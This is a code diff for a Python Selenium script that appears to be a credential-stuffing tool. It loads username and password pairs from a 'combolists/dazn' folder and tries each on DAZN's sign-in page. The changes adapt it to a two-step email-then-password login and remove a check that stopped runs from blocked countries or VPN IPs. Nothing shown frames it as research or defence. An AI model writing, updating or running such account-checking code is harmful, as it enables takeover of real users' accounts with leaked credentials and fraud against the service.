@@ -15,7 +15,6 @@ chrome_version = GetChromeVersionForCurrentOS()
 
 
 def dazn():
-    title()
     file_directory = str(Path(__file__).parents[1]) + '/combolists/dazn'
     page = 'https://www.dazn.com/signin'
     plain_directory = str(Path(__file__).parents[1])
@@ -35,24 +34,25 @@ def dazn():
                 browser_options = Options()
                 browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                                              '(KHTML, like Gecko) Chrome/{} Safari/537.36'.format(chrome_version))
-                browser = webdriver.Chrome(options=browser_options)
+                browser = webdriver.Chrome(options=browser_options, version_main=138)
                 browser.set_window_size(500, 700)
                 browser.get(page)
-                time.sleep(8)
+                time.sleep(20)
                 if browser.find_elements(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]'):
                     gdpr_accept_all_button = browser.find_element(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]')
                     gdpr_accept_all_button.click()
                     time.sleep(8)
-                if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
-                    print('\nCountry not supported, or blacklisted VPN IP')
-                    print('please use a supported location/IP address.\nEnding.\n')
-                    exit()
                 email_input_box = browser.find_element(By.XPATH, '//input[@id="email"]')
-                password_input_box = browser.find_element(By.XPATH, '//input[@id="password"]')
-                sign_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
                 email_input_box.send_keys(users[index])
-                password_input_box.send_keys(passwords[index])
+                time.sleep(3)
+                sign_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
                 sign_in_button.click()
+                time.sleep(10)
+                password_input_box = browser.find_element(By.XPATH, '//input[@id="password"]')
+                password_input_box.send_keys(passwords[index])
+                log_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
+                log_in_button.click()
+                log_in_button.click()
                 time.sleep(10)
                 if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div'):
                     four_two_nine = browser.find_element(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div').text
